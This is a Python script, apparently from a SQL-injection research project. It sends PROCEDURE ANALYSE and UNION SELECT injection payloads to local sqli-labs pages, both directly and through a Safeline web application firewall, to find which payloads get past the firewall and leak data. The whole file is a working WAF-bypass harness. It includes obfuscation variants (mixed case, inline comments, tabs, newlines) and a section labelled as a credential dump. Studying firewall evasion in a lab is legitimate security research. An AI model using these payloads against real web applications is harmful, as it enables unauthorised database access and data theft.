"""
bypass_lab/test_proc_analyse.py
================================
Test PROCEDURE ANALYSE as Safeline bypass vector.

Key finding: Safeline passes 'PROCEDURE ANALYSE(1,1)' — it's not in
the WAF's SQL injection training patterns.

Strategy:
  - Less-2 = numeric injection (WHERE id=$id, no quotes needed)
  - No need to break out of string context → no ' quote → Safeline blind spot
  - PROCEDURE ANALYSE output leaks column names + min/max values = real data

Run:
    python3 -m bypass_lab.test_proc_analyse
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081"
WAF   = "http://localhost:8888"
FOUND = []


def check(host, path, payload, label=""):
    try:
        r = requests.get(f"{host}{path}", params={"id": payload}, timeout=10)
        body = r.text

        has_union = classify_response(body, r.status_code, "union",
                                      strict_markers=True) == "SUCCESS"
        has_user  = any(x in body for x in
                        ["Dumb", "Angelina", "Dhruv", "admin", "SEQSQLI"])
        has_proc  = any(x in body for x in
                        ["Optimal_fieldtype", "varchar", "Field_name",
                         "Min_value", "Max_value", "tinyint"])
        status    = r.status_code

        return {
            "status":    status,
            "union":     has_union,
            "user_data": has_user,
            "proc_out":  has_proc,
            "body":      body,
        }
    except Exception as e:
        return {"status": 0, "union": False, "user_data": False,
                "proc_out": False, "body": str(e)}


def snippet(body, keywords):
    for kw in keywords:
        idx = body.lower().find(kw.lower())
        if idx >= 0:
            return body[max(0, idx - 15):idx + 80].replace("\n", " ")
    return ""


def run(label, path, payload):
    print(f"\n{'─'*60}")
    print(f"  Label  : {label}")
    print(f"  Path   : {path}")
    print(f"  Payload: {payload}")

    p = check(PLAIN, path, payload)
    w = check(WAF,   path, payload)

    print(f"  PLAIN  : HTTP {p['status']} | "
          f"union={p['union']} user={p['user_data']} proc={p['proc_out']}")
    print(f"  WAF    : HTTP {w['status']} | "
          f"union={w['union']} user={w['user_data']} proc={w['proc_out']}")

    if p["proc_out"] or p["user_data"]:
        s = snippet(p["body"],
                    ["Dumb","Angelina","varchar","Min_value","username","Optimal"])
        if s:
            print(f"  PLAIN snippet: {s}")

    if w["proc_out"] or w["user_data"] or w["union"]:
        s = snippet(w["body"],
                    ["Dumb","Angelina","varchar","Min_value","username","Optimal"])
        if s:
            print(f"  WAF snippet  : {s}")
        FOUND.append((label, path, payload))

    time.sleep(0.4)
    return w


# ── A: Less-2 numeric context (no quote needed) ───────────────────────
print("\n[A] Less-2 numeric injection + PROCEDURE ANALYSE")
run("basic proc analyse id=1",
    "/Less-2/", "1 PROCEDURE ANALYSE(1,1)-- -")

run("proc analyse id=1 all cols",
    "/Less-2/", "1 PROCEDURE ANALYSE(0,0)-- -")

run("proc all users (0 OR 1=1)",
    "/Less-2/", "0 OR 1=1 PROCEDURE ANALYSE(1,1)-- -")

run("proc case variation",
    "/Less-2/", "1 pRoCeDuRe aNaLySe(1,1)-- -")

run("proc+comment",
    "/Less-2/", "1 PROCEDURE/**/ANALYSE(1,1)-- -")

run("proc+tab",
    "/Less-2/", "1 PROCEDURE\tANALYSE(1,1)-- -")

run("proc+newline",
    "/Less-2/", "1 PROCEDURE\nANALYSE(1,1)-- -")


# ── B: Less-1 string context (needs quote) ────────────────────────────
print("\n[B] Less-1 string injection + PROCEDURE ANALYSE")
run("Less-1 quote+proc",
    "/Less-1/", "1' PROCEDURE ANALYSE(1,1)-- -")

run("Less-1 quote+proc+case",
    "/Less-1/", "1' pRoCeDuRe aNaLySe(1,1)-- -")

run("Less-1 OR 1=1 + proc",
    "/Less-1/", "1' OR 1=1 PROCEDURE ANALYSE(1,1)-- -")


# ── C: UNION + PROCEDURE ANALYSE combo ────────────────────────────────
print("\n[C] UNION SELECT combined with PROCEDURE ANALYSE")
run("Less-2 union+proc",
    "/Less-2/",
    "-1 UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END' "
    "PROCEDURE ANALYSE(1,1)-- -")

run("Less-1 union+proc",
    "/Less-1/",
    "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END' "
    "PROCEDURE ANALYSE(1,1)-- -")


# ── D: Less-2 numeric injection without PROCEDURE ANALYSE (baseline) ──
print("\n[D] Less-2 baseline — plain UNION SELECT (expect BLOCK on WAF)")
run("Less-2 UNION SELECT baseline",
    "/Less-2/",
    "-1 UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -")

run("Less-2 UNION case",
    "/Less-2/",
    "-1 uNiOn sElEcT database(),'SEQSQLI_START','SEQSQLI_END'-- -")


# ── E: Less-2 PROCEDURE ANALYSE for actual credential dump ───────────
print("\n[E] Data extraction via PROCEDURE ANALYSE output")
run("dump users table via proc",
    "/Less-2/",
    "1 AND 1=1 PROCEDURE ANALYSE(1,1)-- -")

run("proc on joined query attempt",
    "/Less-2/",
    "1 OR id>0 PROCEDURE ANALYSE(1,1)-- -")


# ── Summary ────────────────────────────────────────────────────────────
print("\n" + "=" * 60)
print(f" FOUND (WAF bypassed + data leaked): {len(FOUND)}")
for label, path, payload in FOUND:
    print(f"\n  Label  : {label}")
    print(f"  Path   : {path}")
    print(f"  Payload: {payload}")
